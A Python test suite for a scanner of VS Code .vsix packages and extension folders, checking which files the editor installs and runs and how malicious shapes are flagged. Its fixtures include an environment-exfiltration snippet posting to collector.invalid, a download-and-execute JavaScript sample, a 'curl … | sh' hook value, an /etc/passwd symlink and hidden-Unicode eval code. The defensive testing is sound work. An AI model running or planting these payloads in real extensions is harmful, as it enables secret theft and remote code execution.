"""VS Code extensions (0.1.9, E-1's first part): a `.vsix`, and an installed
extension's folder, read with the editor's rules for what runs and when.

- What VS Code installs: every member whose name begins with `extension`,
  those letters taken off (a `/` after them or not), by the name yauzl gives
  it (a Unicode path field's, when one applies), and nothing else.
- What runs: `main` and `browser`, and what they load, when the editor
  activates the extension (the import-time test; at every start for `*` and
  `onStartupFinished`); everything else when the extension's code calls it
  (the use-time test); `vscode:uninstall`, when it is `node` and a file,
  once the extension has been uninstalled (the install-hook test). npm's
  scripts, a bundled package's scripts and a binding.gyp never run.
- What it brings: `extensionDependencies` and `extensionPack`.
- An installed extension's folder reads as its `.vsix` does (iter_folder),
  and nothing is followed out of it.
- `lazaret FILE.vsix` and `lazaret --extensions [PATH …]`.

Every hostile fragment is one of the suite's inert ones (_review_support,
test_review_hidden_unicode): documentation addresses, nothing ever run."""

import contextlib
import io
import json
import os
import shutil
import subprocess
import sys
import tempfile
import types
import unittest
from unittest import mock

from lazaret import _cli
from lazaret.registry import extensions, repo
from tests import _support
from tests.registry._review_support import (DECODE_EXEC_JS, ELF, EXFIL_JS, issues, manifest, rules, unicode_path,
                                            zip_entries, zipball)
from tests.scanner.test_review_hidden_unicode import vs

#: The files a .vsix holds besides the extension (VS Code installs the manifest, as `.vsixmanifest`).
PACKAGING = {"[Content_Types].xml": '<?xml version="1.0" encoding="utf-8"?><Types/>',
             "extension.vsixmanifest": '<?xml version="1.0" encoding="utf-8"?><PackageManifest/>'}
GLASSWORM_SHAPE = ("const s = v => [...v].map(w => w.codePointAt(0));\n"
                   "eval(Buffer.from(s(`" + vs(b"payload") + "`)).toString());\n")


def ext_manifest(**fields):
    fields.setdefault("publisher", "example")
    fields.setdefault("engines", {"vscode": "^1.90.0"})
    return manifest(**fields)


def vsix(files, extra=None, symlinks=None):
    """{path in the extension: content} -> .vsix bytes (under extension/, with the packaging files)."""
    members = dict(PACKAGING)
    members.update({"extension/" + path: content for path, content in files.items()})
    members.update(extra or {})
    return zipball(members, {"extension/" + p: t for p, t in (symlinks or {}).items()})


def scan(files, **kw):
    return repo._scan_artifact(vsix(files, **kw), "zip", "vsix", False, repo.Budget())


def scan_npm_zip(files):
    """The same files read as an npm package would be (for the contrast)."""
    return repo._scan_artifact(zipball({"package/" + p: c for p, c in files.items()}), "zip", "npm", False,
                               repo.Budget())


def write_tree(root, files):
    for path, content in files.items():
        full = os.path.join(root, *path.split("/"))
        os.makedirs(os.path.dirname(full), exist_ok=True)
        with open(full, "wb") as fh:
            fh.write(content.encode() if isinstance(content, str) else content)


def summary(res):
    return sorted((i["rule"], i["sev"], i["file"]) for i in res["issues"])


class TempDirTest(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.mkdtemp(prefix="lazaret-vsix-")
        self.addCleanup(shutil.rmtree, self.tmp, True)

    def folder(self, files, name="example.x-1.0.0"):
        root = os.path.join(self.tmp, name)
        write_tree(root, files)
        return root


class WhatVSCodeInstallsTests(unittest.TestCase):
    def test_every_member_whose_name_begins_with_extension(self):
        # VS Code's extract(…, {sourcePath: 'extension'}) builds /^extension/: no '/' is needed after it (the review
        # of Oct 7; an installed extension's folder holds the package's manifest as .vsixmanifest)
        for name, rel in (("extension/out/a.js", "out/a.js"), ("extension//out/./a.js", "out/a.js"),
                          ("extensionout/a.js", "out/a.js"), ("extension2/a.js", "2/a.js"),
                          ("extension.vsixmanifest", ".vsixmanifest"), ("extension\\out\\a.js", "out/a.js")):
            with self.subTest(name=name):
                self.assertEqual(repo.canonical_member_path(name, "vsix"), (rel, None))
        for name in ("[Content_Types].xml", "Extension/out/a.js", "extension", "extension/", "other/extension/a.js",
                     ".signature.p7s", "./extension/a.js", "/extension/a.js"):
            with self.subTest(name=name):
                self.assertEqual(repo.canonical_member_path(name, "vsix"), (None, None))
        self.assertEqual(repo.canonical_member_path("extension/../a.js", "vsix"), (None, "path contains '..'"))

    def test_a_name_with_no_slash_after_extension_is_installed_and_read(self):
        # the shape the review found: a listing shows the file outside the extension, and VS Code writes it as the
        # file the manifest starts (it used to be OK: never read)
        files = {"package.json": ext_manifest(main="./out/extension", activationEvents=["onStartupFinished"])}
        res = scan(files, extra={"extensionout/extension.js": EXFIL_JS})
        self.assertEqual(res["verdict"], "SUSPICIOUS")
        self.assertIn("out/extension.js", {i["file"] for i in issues(res, "SC-IMPORT-RISK")})
        named = [i for i in issues(res, "SC-ARCHIVE-PATH") if i["name"] == "Extension file outside extension/"]
        self.assertEqual([i["file"] for i in named], ["extensionout/extension.js"])
        self.assertIn("VS Code installs it as 'out/extension.js'", named[0]["msg"])

    def test_the_package_manifest_is_the_folders_vsixmanifest(self):
        names = [m[0] for m in repo.iter_archive(vsix({"package.json": ext_manifest()}), "zip", "vsix")]
        self.assertEqual(sorted(names), [".vsixmanifest", "package.json"])
        res = scan({"package.json": ext_manifest()})
        self.assertEqual((res["verdict"], res["issues"]), ("OK", []))

    def entries(self, payload_extra, header="assets/readme.txt"):
        return zip_entries([("[Content_Types].xml", PACKAGING["[Content_Types].xml"], b""),
                            ("extension.vsixmanifest", PACKAGING["extension.vsixmanifest"], b""),
                            ("extension/package.json",
                             ext_manifest(main="./out/extension", activationEvents=["onStartupFinished"]), b""),
                            (header, EXFIL_JS, payload_extra)])

    def test_a_unicode_path_field_names_the_file_vs_code_writes(self):
        # yauzl (VS Code's zip reader) takes an entry's Info-ZIP Unicode Path field when its CRC-32 is the header
        # name's: the header said assets/readme.txt (not extracted), VS Code writes out/extension.js
        field = unicode_path("assets/readme.txt", "extension/out/extension.js")
        res = repo._scan_artifact(self.entries(field), "zip", "vsix", False, repo.Budget())
        self.assertEqual(res["verdict"], "SUSPICIOUS")
        self.assertIn("out/extension.js", {i["file"] for i in issues(res, "SC-IMPORT-RISK")})
        two = [i for i in issues(res, "SC-ARCHIVE-PATH") if i["name"] == "Archive entry with two names"]
        self.assertEqual([i["file"] for i in two], ["extension/out/extension.js"])
        self.assertIn("'assets/readme.txt'", two[0]["msg"])
        # a field whose CRC-32 is not the header name's is not read (yauzl, and zipfile from Python 3.12)
        wrong = unicode_path("assets/readme.txt", "extension/out/extension.js", crc=1)
        res = repo._scan_artifact(self.entries(wrong), "zip", "vsix", False, repo.Budget())
        self.assertEqual((res["verdict"], rules(res)), ("OK", set()))
        # nor one of another version
        other = unicode_path("assets/readme.txt", "extension/out/extension.js", version=2)
        res = repo._scan_artifact(self.entries(other), "zip", "vsix", False, repo.Budget())
        self.assertEqual(res["verdict"], "OK")

    def test_two_entries_written_as_package_json(self):
        # the editor checks extension/package.json when it installs, and the extension runs with the last entry
        # written as package.json
        res = scan({"package.json": ext_manifest(main="./a.js"), "a.js": "module.exports = 1;\n",
                    "b.js": EXFIL_JS},
                   extra={"extensionpackage.json": ext_manifest(main="./b.js", activationEvents=["*"])})
        self.assertEqual(res["verdict"], "SUSPICIOUS")
        self.assertEqual({i["file"] for i in issues(res, "SC-IMPORT-RISK")}, {"b.js"})
        self.assertEqual([i["file"] for i in issues(res, "SC-ARCHIVE-DUP")], ["package.json"])

    def test_code_outside_extension_is_not_the_extensions(self):
        res = scan({"package.json": ext_manifest()}, extra={"payload/x.js": DECODE_EXEC_JS})
        self.assertEqual((res["verdict"], res["filesScanned"]), ("OK", 0))

    def test_a_zip_symlink_entry_is_read_as_the_file_vs_code_writes(self):
        res = scan({"package.json": ext_manifest()}, symlinks={"out/a.js": "../../etc/passwd"})
        msg = issues(res, "SC-ARCHIVE-LINK")[0]["msg"]
        self.assertIn("VS Code installs its stored bytes as a regular file", msg)


class WhatRunsTests(unittest.TestCase):
    def test_main_runs_when_the_editor_activates_the_extension(self):
        res = scan({"package.json": ext_manifest(main="./out/extension"), "out/extension.js": EXFIL_JS})
        found = issues(res, "SC-IMPORT-RISK")
        self.assertEqual([(i["sev"], i["file"]) for i in found], [("CRITICAL", "out/extension.js")])
        self.assertIn("runs when the editor activates the extension, and it", found[0]["msg"])
        self.assertIn("extension host", found[0]["why"])
        self.assertEqual(res["verdict"], "SUSPICIOUS")

    def test_a_case_twin_of_the_main_file_is_read_as_the_main_file(self):
        # EG-4: on macOS and Windows, out/Extension.js written after out/extension.js is the file main names
        res = scan({"package.json": ext_manifest(main="./out/extension", activationEvents=["*"]),
                    "out/extension.js": "module.exports = 1;\n", "out/Extension.js": EXFIL_JS})
        self.assertEqual(res["verdict"], "SUSPICIOUS")
        self.assertEqual({i["file"] for i in issues(res, "SC-IMPORT-RISK")}, {"out/Extension.js"})
        self.assertIn("SC-ARCHIVE-DUP", rules(res))

    def test_a_case_twin_of_the_manifest_is_read_as_the_manifest(self):
        # EG-4's leftover: on macOS and Windows, Package.json written after package.json is the manifest the editor
        # reads: what its main names runs when the editor activates the extension, and its vscode:uninstall runs
        res = scan({"package.json": ext_manifest(main="./out/extension"),
                    "Package.json": ext_manifest(main="./out/real", activationEvents=["*"]),
                    "out/extension.js": "module.exports = 1;\n", "out/real.js": EXFIL_JS})
        self.assertEqual(res["verdict"], "SUSPICIOUS")
        self.assertEqual({i["file"] for i in issues(res, "SC-IMPORT-RISK")}, {"out/real.js"})
        res = scan({"package.json": ext_manifest(main="./out/extension"),
                    "Package.json": ext_manifest(main="./out/extension", scripts={"vscode:uninstall": "node ./out/u.js"}),
                    "out/extension.js": "module.exports = 1;\n", "out/u.js": EXFIL_JS})
        self.assertEqual(res["verdict"], "SUSPICIOUS")
        hook = issues(res, "SC-INSTALL-HOOK")
        self.assertEqual([(i["file"], i["name"]) for i in hook], [("Package.json", "Uninstall hook")])
        self.assertTrue(hook[0]["msg"].startswith("The vscode:uninstall script runs ./out/u.js"), hook[0]["msg"])

    def test_an_entry_outside_the_extensions_folder_is_said_and_not_cleared(self):
        # EG-3: VS Code joins main (and browser) to the extension's folder and runs what it names wherever that is,
        # with a warning only; a pack member's folder is one such place (`../publisher.name-1.0.0/…`)
        for key, target in (("main", "../example.helper-1.0.0/dist/x.js"), ("main", "./out/../../x.js"),
                            ("browser", "../x.js")):
            with self.subTest(key=key, target=target):
                res = scan({"package.json": ext_manifest(**{key: target}), "out/x.js": "module.exports = 1;\n"})
                found = issues(res, "SC-UNREAD-CODE")
                self.assertEqual([(i["name"], i["file"], i["sev"]) for i in found],
                                 [("Extension code outside the extension", "package.json", "MAJOR")])
                self.assertIn(f'"{key}" names {target!r}, outside the extension\'s folder', found[0]["msg"])
                self.assertEqual(res["verdict"], "INCOMPLETE")
        # inside the folder (a leading '/' is the folder's own root too), a missing file is no finding: the editor
        # fails to activate the extension
        for target in ("./missing.js", "/out/missing.js"):
            with self.subTest(target=target):
                self.assertEqual(scan({"package.json": ext_manifest(main=target)})["verdict"], "OK")

    def test_at_every_start_for_star_and_on_startup_finished(self):
        for event in ("*", "onStartupFinished"):
            with self.subTest(event=event):
                res = scan({"package.json": ext_manifest(main="out/e.js", activationEvents=["onCommand:x", event]),
                            "out/e.js": EXFIL_JS})
                self.assertEqual(res["startupEvent"], event)
                self.assertIn(f"(at every start: activation event {event!r})",
                              issues(res, "SC-IMPORT-RISK")[0]["msg"])
        res = scan({"package.json": ext_manifest(main="out/e.js", activationEvents=["onLanguage:python", 3]),
                    "out/e.js": "1;\n"})
        self.assertIsNone(res["startupEvent"])

    def test_the_browser_entry_runs_too(self):
        res = scan({"package.json": ext_manifest(browser="./dist/web/extension"),
                    "dist/web/extension.js": EXFIL_JS})
        self.assertEqual([i["file"] for i in issues(res, "SC-IMPORT-RISK")], ["dist/web/extension.js"])

    def test_what_main_loads_runs_with_it(self):
        res = scan({"package.json": ext_manifest(main="./out/extension"),
                    "out/extension.js": "const h = require('./helper');\nexports.activate = () => h();\n",
                    "out/helper.js": EXFIL_JS})
        self.assertEqual([i["file"] for i in issues(res, "SC-IMPORT-RISK")], ["out/helper.js"])

    def test_without_main_or_browser_no_module_runs_at_activation(self):
        # npm loads index.js for a package without main; the editor loads nothing
        files = {"package.json": ext_manifest(), "index.js": EXFIL_JS}
        self.assertEqual(rules(scan_npm_zip(files)) & {"SC-IMPORT-RISK", "SC-USE-RISK"}, {"SC-IMPORT-RISK"})
        res = scan(files)
        self.assertEqual(rules(res) & {"SC-IMPORT-RISK", "SC-USE-RISK"}, {"SC-USE-RISK"})
        use = issues(res, "SC-USE-RISK")[0]
        self.assertIn("The editor does not load it when it activates the extension", use["msg"])
        self.assertEqual(use["fix"], "Uninstall the extension; report it to the marketplace that serves it.")

    def test_npm_scripts_and_a_bundled_packages_scripts_never_run(self):
        files = {"package.json": ext_manifest(scripts={"postinstall": "node ./x.js", "vscode:prepublish": "tsc"}),
                 "x.js": "1;\n",
                 "node_modules/dep/package.json": manifest(name="dep", scripts={"install": "node y.js"}),
                 "node_modules/dep/y.js": "1;\n"}
        self.assertIn("SC-INSTALL-HOOK", rules(scan_npm_zip(files)))
        res = scan(files)
        self.assertEqual((res["verdict"], issues(res, "SC-INSTALL-HOOK")), ("OK", []))

    def test_a_binding_gyp_is_data(self):
        gyp = json.dumps({"targets": [{"target_name": "a", "actions": [
            {"action_name": "b", "inputs": [], "outputs": ["c"], "action": ["node", "build.js"]}]}]})
        files = {"package.json": ext_manifest(), "binding.gyp": gyp, "build.js": "1;\n"}
        self.assertIn("SC-INSTALL-HOOK", rules(scan_npm_zip(files)))
        self.assertNotIn("SC-INSTALL-HOOK", rules(scan(files)))

    def test_the_glassworm_shape_in_main(self):
        res = scan({"package.json": ext_manifest(main="out/e.js"), "out/e.js": GLASSWORM_SHAPE})
        self.assertEqual(res["verdict"], "SUSPICIOUS")
        self.assertIn("CRITICAL", {i["sev"] for i in issues(res, "SC-HIDDEN-UNICODE")})


#: The whole environment posted from Python (inert: a .invalid host)
EXFIL_PY = "import os, json, requests\nrequests.post('https://collector.invalid/c', data=json.dumps(dict(os.environ)))\n"
#: A shape the import-time test calls MAJOR and the use-time test does not report (a binary downloaded and run)
DOWNLOAD_RUN_JS = ("const https = require('https'), fs = require('fs');\n"
                   "const {execFileSync} = require('child_process');\n"
                   "https.get('https://dl.example.invalid/tool', (r) => r.pipe(fs.createWriteStream('/tmp/tool'))\n"
                   "  .on('finish', () => execFileSync('/tmp/tool', ['--version'])));\n")

def contributing(contributes, files, **fields):
    """An extension whose main does nothing, with `contributes` and the files given (EG-5)."""
    fields.setdefault("main", "./out/extension")
    fields.setdefault("activationEvents", ["onLanguage:unrelated"])
    return dict(files, **{"package.json": ext_manifest(contributes=contributes, **fields),
                          "out/extension.js": "exports.activate = () => {};\n"})


class ContributionTests(unittest.TestCase):
    """EG-5: code an extension's `contributes` names, which VS Code (or a process it starts) runs without the
    extension's main module, is an entry point: it gets the import-time test, which says when it runs."""

    def import_risk(self, res):
        return sorted((i["file"], i["sev"]) for i in issues(res, "SC-IMPORT-RISK"))

    def test_a_typescript_server_plugin(self):
        # the TypeScript server loads node_modules/<name> from every installed extension's folder whenever a
        # JavaScript or TypeScript file is open, whether or not the extension is activated
        plugin = {"node_modules/ts-plugin/package.json": '{"name": "ts-plugin", "main": "lib/index.js"}',
                  "node_modules/ts-plugin/lib/index.js": "require('./load');\n",
                  "node_modules/ts-plugin/lib/load.js": DOWNLOAD_RUN_JS}
        res = scan(contributing({"typescriptServerPlugins": [{"name": "ts-plugin"}]}, plugin))
        self.assertEqual(self.import_risk(res), [("node_modules/ts-plugin/lib/load.js", "MAJOR")])
        msg = issues(res, "SC-IMPORT-RISK")[0]["msg"]
        self.assertIn("runs in the TypeScript server whenever a JavaScript or TypeScript file is open", msg)
        self.assertEqual(res["verdict"], "WARN")
        # (before EG-5 a MAJOR shape there was no finding: the file got the use-time test alone)
        res = scan(contributing({}, plugin))
        self.assertEqual((res["verdict"], self.import_risk(res)), ("OK", []))
        # a name that is not a package's is not one TypeScript loads; a scoped one is
        res = scan(contributing({"typescriptServerPlugins": [{"name": "../out/x"}, {"name": 5}]},
                                {"out/x.js": DOWNLOAD_RUN_JS}))
        self.assertEqual(self.import_risk(res), [])
        res = scan(contributing({"typescriptServerPlugins": [{"name": "@scope/p"}]},
                                {"node_modules/@scope/p/index.js": EXFIL_JS}))
        self.assertEqual(self.import_risk(res), [("node_modules/@scope/p/index.js", "CRITICAL")])

    def test_a_debug_adapter(self):
        # VS Code joins a debug adapter's program to the extension's folder and starts it when a debug session of
        # its type starts (Node forks it when the runtime is node), each platform's block too
        dbg = {"type": "foo", "runtime": "node", "program": "./out/dap.js",
               "windows": {"program": "./out/dap-win.js"}, "linux": {"runtime": "./bin/run.py"}}
        res = scan(contributing({"debuggers": [dbg]}, {"out/dap.js": DOWNLOAD_RUN_JS, "out/dap-win.js": EXFIL_JS,
                                                     "bin/run.py": EXFIL_PY}))
        found = issues(res, "SC-IMPORT-RISK")
        self.assertEqual(sorted(i["file"] for i in found), ["bin/run.py", "out/dap-win.js", "out/dap.js"])
        self.assertTrue(all("runs as the extension's debug adapter when a debug session of type 'foo' starts"
                            in i["msg"] for i in found), [i["msg"] for i in found])
        # an absolute program and a runtime on the PATH are not the extension's; one outside its folder is said
        dbg = {"type": "foo", "runtime": "python", "program": "../other.ext-1.0.0/dap.py",
               "osx": {"program": "/usr/local/bin/dap"}}
        res = scan(contributing({"debuggers": [dbg]}, {}))
        outside = issues(res, "SC-UNREAD-CODE")
        self.assertEqual(len(outside), 1)
        self.assertIn('"program" names \'../other.ext-1.0.0/dap.py\'', outside[0]["msg"])
        self.assertIn("when a debug session of type 'foo' starts", outside[0]["msg"])
        self.assertEqual(res["verdict"], "INCOMPLETE")

    def test_webview_scripts(self):
        res = scan(contributing({"notebookRenderer": [{"id": "r", "entrypoint": "./out/renderer.js"},
                                                      {"id": "s", "entrypoint": {"extends": "r", "path": "./out/x.js"}}],
                                 "markdown.previewScripts": ["./media/preview.js"]},
                                {"out/renderer.js": EXFIL_JS, "out/x.js": EXFIL_JS, "media/preview.js": EXFIL_JS}))
        found = {i["file"]: i["msg"] for i in issues(res, "SC-IMPORT-RISK")}
        self.assertEqual(sorted(found), ["media/preview.js", "out/renderer.js", "out/x.js"])
        self.assertIn("runs in a notebook's output webview", found["out/renderer.js"])
        self.assertIn("runs in the Markdown preview's webview", found["media/preview.js"])

    def test_a_file_main_loads_too_says_when_the_editor_activates_the_extension(self):
        res = scan(contributing({"typescriptServerPlugins": [{"name": "shared"}]},
                                {"node_modules/shared/index.js": EXFIL_JS},
                                main="./node_modules/shared/index.js", activationEvents=["*"]))
        msg = issues(res, "SC-IMPORT-RISK")[0]["msg"]
        self.assertIn("runs when the editor activates the extension (at every start", msg)


class UninstallHookTests(unittest.TestCase):
    def test_a_node_script_is_a_hook_in_the_editors_words(self):
        res = scan({"package.json": ext_manifest(scripts={"vscode:uninstall": "node ./out/cleanup"}),
                    "out/cleanup.js": "console.log('bye');\n"})
        [hook] = issues(res, "SC-INSTALL-HOOK")
        self.assertEqual((hook["sev"], hook["name"]), ("MAJOR", "Uninstall hook"))
        self.assertEqual(hook["msg"], "\"vscode:uninstall\" script runs code when VS Code uninstalls the extension: "
                                      "'node ./out/cleanup'.")
        self.assertIn("at the editor's next start", hook["why"])
        self.assertIn("capability to review", hook["why"])
        self.assertEqual(res["verdict"], "WARN")

    def test_the_script_it_runs_gets_the_install_script_test(self):
        res = scan({"package.json": ext_manifest(scripts={"vscode:uninstall": "node ./out/cleanup --quiet"}),
                    "out/cleanup.js": EXFIL_JS})
        [hook] = issues(res, "SC-INSTALL-HOOK")
        self.assertEqual(hook["sev"], "CRITICAL")
        self.assertTrue(hook["msg"].startswith("The vscode:uninstall script runs ./out/cleanup, which "), hook["msg"])
        self.assertIn("does what malicious install hooks do", hook["why"])
        self.assertEqual(res["verdict"], "SUSPICIOUS")

    def test_a_command_vs_code_does_not_run_is_inventory(self):
        # VS Code runs only `node <file>`, split on single spaces; it logs anything else and runs nothing
        for cmd in ("sh ./out/cleanup.sh", "node", "node  ./out/cleanup.js", "nodejs ./out/cleanup.js",
                    "curl http://192.0.2.1/x | sh"):
            with self.subTest(cmd=cmd):
                self.assertFalse(repo.vsix_hook_runs(cmd))
                res = scan({"package.json": ext_manifest(scripts={"vscode:uninstall": cmd}),
                            "out/cleanup.sh": "echo bye\n", "out/cleanup.js": EXFIL_JS})
                [hook] = issues(res, "SC-INSTALL-HOOK")
                self.assertEqual(hook["sev"], "INFO")
                self.assertIn("is not one VS Code runs", hook["msg"])
                self.assertNotIn("cmd", hook)
        self.assertTrue(repo.vsix_hook_runs("node ./out/cleanup.js --flag"))

    def test_only_the_extensions_own_manifest_has_the_hook(self):
        res = scan({"package.json": ext_manifest(),
                    "node_modules/dep/package.json": manifest(scripts={"vscode:uninstall": "node ./x"}),
                    "node_modules/dep/x.js": "1;\n"})
        self.assertEqual(issues(res, "SC-INSTALL-HOOK"), [])


class WhatItBringsTests(unittest.TestCase):
    def test_extension_dependencies_and_pack_members(self):
        res = scan({"package.json": ext_manifest(
            extensionDependencies=["Example.Base", "example.base", "not an id", 7, "a.b.c"],
            extensionPack=["other.Pack-Member", "-bad.x", "ok.y"])})
        self.assertEqual(res["extensionDependencies"], ["example.base", "ok.y", "other.pack-member"])

    def test_at_most_the_first_entries_of_each_list(self):
        many = [f"p.e{i}" for i in range(repo.MAX_VSIX_DEPENDENCIES + 5)]
        res = scan({"package.json": ext_manifest(extensionPack=many)})
        self.assertEqual(len(res["extensionDependencies"]), repo.MAX_VSIX_DEPENDENCIES)

    def test_who_it_says_it_is(self):
        res = scan({"package.json": ext_manifest(name="hello", version="2.0.1", publisher="Example")})
        self.assertEqual(res["manifest"], {"publisher": "Example", "name": "hello", "version": "2.0.1"})
        res = scan({"package.json": json.dumps({"name": "x", "version": 3})})
        self.assertEqual(res["manifest"], {"publisher": None, "name": "x", "version": None})

    def test_npm_look_alike_names_are_not_an_extensions(self):
        files = {"package.json": ext_manifest(name="lodahs", dependencies={"expresss": "1.0.0"})}
        self.assertIn("SC-TYPOSQUAT", rules(scan_npm_zip(files)))
        self.assertNotIn("SC-TYPOSQUAT", rules(scan(files)))


class FolderTests(TempDirTest):
    FILES = {"package.json": ext_manifest(main="./out/extension", activationEvents=["*"],
                                          scripts={"vscode:uninstall": "node out/bye"}),
             "out/extension.js": "require('./helper');\n", "out/helper.js": EXFIL_JS,
             "out/bye.js": "1;\n", "media/a.png": b"\x89PNG\r\n\x1a\n" + b"\x00" * 64, "bin/tool": ELF}

    def test_a_folder_reads_as_its_vsix(self):
        res = extensions.scan_folder(self.folder(self.FILES))
        path = os.path.join(self.tmp, "x.vsix")
        with open(path, "wb") as fh:
            fh.write(vsix(self.FILES))
        res_vsix = extensions.scan_vsix(path)
        self.assertEqual(summary(res), summary(res_vsix))
        for key in ("verdict", "filesScanned", "binaryArtifacts", "startupEvent", "name", "version"):
            self.assertEqual(res[key], res_vsix[key], key)
        self.assertEqual((res["name"], res["version"], res["verdict"]), ("example.x", "1.0.0", "SUSPICIOUS"))
        self.assertEqual(res["artifact"], "folder")
        self.assertTrue(res_vsix["digest"].startswith("sha256:"))

    def test_the_order_is_fixed(self):
        root = self.folder({"b.js": "1;\n", "a/z.js": "1;\n", "a/b.js": "1;\n", "A.js": "1;\n", "c/d/e.js": "1;\n"})
        self.assertEqual([m[0] for m in repo.iter_folder(root)], ["A.js", "a/b.js", "a/z.js", "b.js", "c/d/e.js"])

    @unittest.skipUnless(hasattr(os, "symlink") and os.name != "nt", "symbolic links")
    def test_links(self):
        outside = os.path.join(self.tmp, "outside")
        write_tree(outside, {"x.js": EXFIL_JS})
        root = self.folder({"package.json": ext_manifest(main="out/e.js"), "real/e.js": "1;\n", "dir/f.js": "1;\n"})
        os.makedirs(os.path.join(root, "out"))
        os.symlink(os.path.join(root, "real", "e.js"), os.path.join(root, "out", "e.js"))   # read as that file
        members = {m[0]: m for m in repo.iter_folder(root)}
        self.assertEqual(members["out/e.js"][2], b"1;\n")
        self.assertIsNone(members["out/e.js"][3])
        for name, target, why in (("away.js", os.path.join(outside, "x.js"), "a link out of the folder"),
                                  ("alias", os.path.join(root, "dir"), "a link to a folder"),
                                  ("gone.js", os.path.join(root, "nothing.js"), "a link to nothing")):
            with self.subTest(link=name):
                os.symlink(target, os.path.join(root, name))
                member = {m[0]: m for m in repo.iter_folder(root)}[name]
                self.assertEqual(member[3], "corrupt")
                self.assertEqual(member.detail, f"{name} is {why}, which the scan does not follow")
                res = extensions.scan_folder(root)
                self.assertEqual(res["verdict"], "INCOMPLETE")
                os.unlink(os.path.join(root, name))

    @unittest.skipUnless(hasattr(os, "symlink") and os.name != "nt", "symbolic links")
    def test_a_linked_extension_folder_is_read(self):
        root = self.folder(self.FILES, name="dev")
        link = os.path.join(self.tmp, "example.x-1.0.0")
        os.symlink(root, link)
        self.assertEqual(summary(extensions.scan_folder(link)), summary(extensions.scan_folder(root)))

    @unittest.skipUnless(hasattr(os, "mkfifo"), "FIFOs")
    def test_a_fifo_is_never_opened(self):
        root = self.folder({"package.json": ext_manifest(), "a.js": "1;\n"})
        os.mkfifo(os.path.join(root, "pipe.js"))
        opened, real = [], repo._read_regular

        def read(path, limit, budget):
            opened.append(os.path.basename(path))
            return real(path, limit, budget)

        with mock.patch.object(repo, "_read_regular", read):
            self.assertEqual([m[0] for m in repo.iter_folder(root)], ["a.js", "package.json"])
        self.assertEqual(opened, ["a.js", "package.json"])

    def test_a_file_it_cannot_read_makes_it_incomplete(self):
        root = self.folder({"package.json": ext_manifest(), "a.js": "1;\n"})
        real = repo._read_regular

        def refuse(path, limit, budget):
            if os.path.basename(path) == "a.js":
                raise PermissionError(13, "Permission denied")
            return real(path, limit, budget)

        with mock.patch.object(repo, "_read_regular", refuse):
            res = extensions.scan_folder(root)
        self.assertEqual(res["verdict"], "INCOMPLETE")
        self.assertIn("a.js could not be read (Permission denied)", issues(res, "SC-TRUNCATED")[0]["msg"])

    def test_the_archive_limits_hold(self):
        root = self.folder({"package.json": ext_manifest(), "a/1.js": "1;\n", "a/2.js": "1;\n", "b/3.js": "1;\n",
                            "b/4.js": "x" * 300})
        with mock.patch.object(repo, "MAX_FILES", 3):
            res = extensions.scan_folder(root)
        self.assertEqual(res["verdict"], "INCOMPLETE")
        self.assertIn("the folder holds more than 3 files (stopped at b/4.js)", issues(res, "SC-TRUNCATED")[0]["msg"])
        with mock.patch.object(repo, "MAX_MEMBER", 100):
            res = extensions.scan_folder(root)
        self.assertIn("b/4.js is larger than the 100-byte source-scan limit", issues(res, "SC-TRUNCATED")[0]["msg"])
        many = self.folder({"package.json": ext_manifest(), **{f"lib/m{i}.js": "1;\n" for i in range(4)}}, "many")
        with mock.patch.object(repo, "MAX_FILES", 3):
            last = list(repo.iter_folder(many))[-1]
            self.assertEqual((last[0], last[3], last.detail), ("lib", "files", "the folder lib holds more than 3 names"))
            [first] = list(repo.iter_folder(os.path.join(many, "lib")))
            self.assertEqual((first[0], first[3], first.detail), ("(folder)", "files", "the folder holds more than 3 names"))
        budget = repo.Budget(total=100)
        last = list(repo.iter_folder(root, budget=budget))[-1]
        self.assertEqual((last[3], last.detail.split(" (")[0]), ("total", "the folder's files are more than 100 bytes in all"))

    def test_a_folder_of_too_many_names_is_not_listed_whole(self):
        taken = []

        class Entries:
            def __enter__(self):
                return self

            def __exit__(self, *exc):
                return False

            def __iter__(self):
                for i in range(1000):
                    taken.append(i)
                    yield types.SimpleNamespace(name=f"e{i:04d}")

        with mock.patch.object(repo, "MAX_FILES", 3), mock.patch.object(repo.os, "scandir", lambda path: Entries()):
            self.assertEqual([e.name for e in repo._folder_listing("x")], ["e0000", "e0001", "e0002", "e0003"])
        self.assertEqual(len(taken), 4)

    def test_a_root_that_is_not_a_folder(self):
        [member] = list(repo.iter_folder(os.path.join(self.tmp, "missing")))
        self.assertEqual((member[0], member[3]), ("(folder)", "corrupt"))


class FindTargetsTests(TempDirTest):
    def home(self):
        home = os.path.join(self.tmp, "home")
        write_tree(home, {
            ".vscode/extensions/example.a-1.0.0/package.json": ext_manifest(name="a"),
            ".vscode/extensions/example.b-2.0.0/package.json": ext_manifest(name="b"),
            ".vscode/extensions/extensions.json": "[]",
            ".vscode/extensions/.obsolete": "{}",
            ".vscode/extensions/not-an-extension/readme.md": "x",
            ".cursor/extensions/example.c-1.0.0-darwin-arm64/package.json": ext_manifest(name="c"),
            "elsewhere/example.d-1.0.0/package.json": ext_manifest(name="d"),
        })
        return home

    def test_the_editors_folders(self):
        home = self.home()
        env = {"VSCODE_EXTENSIONS": os.path.join(home, "elsewhere")}
        targets, notes = extensions.find_targets([], True, env=env, home=home)
        self.assertEqual([(k, os.path.relpath(p, home), w) for k, p, w in targets], [
            ("folder", os.path.join(".vscode", "extensions", "example.a-1.0.0"), "VS Code"),
            ("folder", os.path.join(".vscode", "extensions", "example.b-2.0.0"), "VS Code"),
            ("folder", os.path.join(".cursor", "extensions", "example.c-1.0.0-darwin-arm64"), "Cursor"),
            ("folder", os.path.join("elsewhere", "example.d-1.0.0"), "VSCODE_EXTENSIONS")])
        self.assertEqual(notes, [])
        # the folder VSCODE_EXTENSIONS names is VS Code's, however it is spelled: listed once
        env = {"VSCODE_EXTENSIONS": os.path.join(home, ".vscode", ".", "extensions")}
        self.assertEqual([w for _l, w in extensions.default_folders(env, home)], [
            os.path.join(home, ".vscode", "extensions"), os.path.join(home, ".cursor", "extensions")])

    def test_code_server(self):
        home = self.home()
        write_tree(home, {"data/code-server/extensions/example.e-1/package.json": ext_manifest(name="e")})
        folders = extensions.default_folders({"XDG_DATA_HOME": os.path.join(home, "data")}, home)
        self.assertIn(("code-server", os.path.join(home, "data", "code-server", "extensions")), folders)

    def test_nothing_installed_is_a_note(self):
        targets, notes = extensions.find_targets([], True, env={}, home=os.path.join(self.tmp, "empty"))
        self.assertEqual(targets, [])
        self.assertIn("no installed extensions found", notes[0])

    def test_paths(self):
        home = self.home()
